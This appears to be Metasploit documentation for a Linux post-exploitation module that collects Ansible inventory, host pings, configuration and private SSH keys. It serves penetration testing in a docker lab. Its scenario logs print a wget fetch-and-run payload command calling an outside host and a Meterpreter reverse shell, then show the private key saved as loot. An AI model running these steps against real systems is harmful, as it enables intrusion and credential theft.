## Vulnerable Application

This module will grab ansible information including hosts, ping status, and the configuration file.

### Docker-compose Install

Use the ansible lab files located [here](https://github.com/abdennour/ansible-lab-environment-in-containers).

Before bringing up the `docker-compose` instance, you'll want to generate an SSH key: `ssh-keygen -t rsa -N "" -f secrets/id_rsa`

Of note, only 1 of the 3 alpine hosts will be successful due to the port conflict. This is fine though.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Get an initial shell on the box
1. Do: `use post/linux/gather/ansible`
1. Do: `set session [#]`
1. Do: `run`
1. You should get information about the ansible install and host.

## Options

### ANSIBLE

Location of ansible executable if not in a standard location. This is added to a list of default locations
which includes `/usr/local/bin/ansible`. Defaults to ``

### ANSIBLEINVENTORY

Location of ansible-inventory executable if not in a standard location. This is added to a list of default locations
which includes `/usr/local/bin/ansible-inventory`. Defaults to ``

### ANSIBLECFG

Location of ansible-inventory executable if not in a standard location. This is added to a list of default locations
which includes `/etc/ansible/ansible.cfg`. Defaults to ``

### HOSTS

Which Ansible host (groups) to target. Defaults to `all`

## Scenarios

### Docker compose as mentioned above

Get initial access to the system

```
resource (ansible.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (ansible.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (ansible.rb)> set srvport 8181
srvport => 8181
resource (ansible.rb)> set target 7
target => 7
resource (ansible.rb)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (ansible.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Using URL: http://1.1.1.1:8181/qsmOaSn61Y
[*] Server started.
[*] Run the following command on the target machine:
wget -qO D418BdOM --no-check-certificate http://1.1.1.1:8181/qsmOaSn61Y; chmod +x D418BdOM; ./D418BdOM& disown
[*] Starting persistent handler(s)...
[*] Sending stage (3045380 bytes) to 172.28.0.3
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 172.28.0.3:52506) at 2023-12-13 12:32:03 -0500
```


```
resource (ansible.rb)> use post/linux/gather/ansible
resource (ansible.rb)> set ANSIBLECFG /playbook/ansible.cfg
ANSIBLECFG => /playbook/ansible.cfg
resource (ansible.rb)> set session 1
session => 1
resource (ansible.rb)> set verbose true
verbose => true
[msf](Jobs:1 Agents:2) post(linux/gather/ansible) > run

[+] Stored inventory to: /root/.msf4/loot/20231213123519_default_172.28.0.3_ansible.inventor_801476.json
[+] Ansible Hosts
=============

 Host                       Connection
 ----                       ----------
 alpine-example-com         ssh
 alpinesystemd-example-com  docker
 centos7-example-com        docker
 rhel8-example-com          docker

[+] Stored pings to: /root/.msf4/loot/20231213123529_default_172.28.0.3_ansible.ping_007951.txt
[+] Ansible Pings
=============

 Host                       Status   Ping  Changed
 ----                       ------   ----  -------
 alpine-example-com         SUCCESS  pong  false
 alpinesystemd-example-com  SUCCESS  pong  false
 centos7-example-com        SUCCESS  pong  false
 rhel8-example-com          SUCCESS  pong  false

[+] Stored config to: /root/.msf4/loot/20231213123530_default_172.28.0.3_ansible.cfg_563982.txt
[+] Private key file location: /secrets/id_rsa
[+] Stored private key file to: /root/.msf4/loot/20231213123530_default_172.28.0.3_ansible.private._084820.txt
[*] Post module execution completed
```
